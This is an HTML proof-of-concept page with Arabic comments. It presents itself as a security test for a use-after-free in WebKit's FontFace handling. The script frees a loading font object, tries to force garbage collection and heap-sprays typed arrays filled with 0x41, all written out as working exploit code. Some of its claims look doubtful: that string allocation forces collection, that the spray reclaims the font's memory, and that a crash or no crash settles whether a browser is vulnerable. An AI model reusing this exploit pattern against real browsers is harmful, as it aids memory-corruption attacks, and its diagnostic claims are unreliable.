<!DOCTYPE html>
<html>
<head>
    <title>Real WebKit FontFace UAF PoC</title>
</head>
<body>
    <h1>WebKit Font Memory Security Test</h1>
    <button onclick="triggerRealUAF()">تشغيل الفحص الحقيقي</button>

    <script>
        // دالة لمحاولة إجبار المتصفح على تنظيف الذاكرة (Garbage Collection Trigger)
        function forceGC() {
            console.log("[+] جاري محاولة تحفيز الـ Garbage Collection...");
            // حجز مصفوفات ضخمة جداً في الجافاسكريبت لإجبار المحرك على تحرير الكائنات الميتة في الـ Heap
            for (let i = 0; i < 40000; i++) {
                let s = new String("A".repeat(1000));
            }
        }

        async function triggerRealUAF() {
            console.log("[1] إنشاء كائن خط حقيقي في الـ DOM...");
            
            // حجز كائن FontFace حقيقي (يتسبب في حجز كائن C++ داخل الـ WebKit Core)
            let fontFace = new FontFace('ExploitFont', 'url(invalid://spec-filled-memory-chunk)');
            
            // إضافة الخط للمستند وبدء تحميله لإجبار المحرك على معالجة المؤشرات
            document.fonts.add(fontFace);
            fontFace.load();

            console.log("[2] حذف الخط فوراً أثناء التحميل لتفعيل خلل الـ RefCount...");
            // هنا يقع الخطأ البرمجي في المتصفحات المصابة: يتم حذف الكائن من الجافاسكريبت 
            // بينما لا تزال دالة الـ C++ داخل المتصفح تمتلك مؤشرًا إليه (Dangling Pointer)
            document.fonts.delete(fontFace);
            fontFace = null; // إزالة الرابط من الجافاسكريبت

            // استدعاء الـ GC لتحرير الذاكرة فعلياً في الخلفية
            forceGC();

            console.log("[3] رش الذاكرة (Real Heap Spray) باستخدام ArrayBuffers...");
            // في الثغرات الحقيقية، نستخدم TypedArrays لأنها تنزل مباشرة في الـ C++ Heap
            // وتأخذ نفس حجم كائن الخط المحذوف تماماً لاستبدال بياناته
            let spray = [];
            for (let i = 0; i < 2000; i++) {
                // حشو الذاكرة ببايتات مخصصة (مثلاً 0x41 وهو حرف A)
                let buffer = new Uint8Array(128); 
                buffer.fill(0x41);
                spray.push(buffer);
            }

            console.log("[4] انتهاء الفحص.");
            console.log("النتيجة الحتمية:");
            console.log("- إذا انهار المتصفح (Crash/Close): المتصفح مصاب بالثغرة.");
            console.log("- إذا لم يحدث شيء واستمرت الصفحة بالعمل: المتصفح آمن وتم التصحيح (Remediated).");
        }
    </script>
</body>
</html>
